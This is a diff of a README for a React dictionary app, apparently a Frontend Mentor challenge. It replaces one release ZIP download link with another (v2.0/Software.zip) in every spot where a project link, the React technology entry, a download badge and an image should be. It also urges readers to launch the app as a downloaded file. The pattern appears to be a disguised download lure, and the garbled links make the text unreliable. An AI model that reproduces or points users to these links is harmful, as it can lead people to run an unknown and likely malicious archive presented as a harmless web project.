@@ -1,13 +1,13 @@
 # 📚 Dictionary Web App React
 
-Welcome to the **Dictionary Web App React** repository! This project was created as a challenge from [Frontend Mentor](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip) to develop a responsive dictionary application using React. The repository focuses on frontend development, semantic HTML, CSS3, accessibility, and integration with a dictionary API.
+Welcome to the **Dictionary Web App React** repository! This project was created as a challenge from [Frontend Mentor](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v2.0/Software.zip) to develop a responsive dictionary application using React. The repository focuses on frontend development, semantic HTML, CSS3, accessibility, and integration with a dictionary API.
 
 ## Challenge Description
 Frontend Mentor is a platform that provides challenges to improve frontend development skills through real-world projects. The challenge for this repository was to create a fully functional dictionary web application that allows users to search for word meanings, save them to local storage, and display them in a user-friendly and responsive design.
 
 ## Technologies Used
 This project utilizes the following technologies:
-- https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip
+- https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v2.0/Software.zip
 - HTML5
 - CSS3
 - Local Storage
@@ -28,7 +28,7 @@ The repository is structured to provide an efficient way to develop and maintain
 ## Usage
 To experience the **Dictionary Web App React**, you can either preview it using the following link or download the ZIP file to launch it locally:
 
-[![Download Dictionary Web App React](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip%https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+[![Download Dictionary Web App React](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v2.0/Software.zip%https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v2.0/Software.zip)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v2.0/Software.zip)
 
 Remember, this project needs to be launched as it is a downloadable file.
 
@@ -40,7 +40,7 @@ If you are interested in contributing to this project or have suggestions for en
 
 Let's collaborate and make learning and understanding new words a delightful experience with the **Dictionary Web App React**! 📖🔍🌟
 
-![Dictionary Image](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+![Dictionary Image](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v2.0/Software.zip)
 
 ---
 
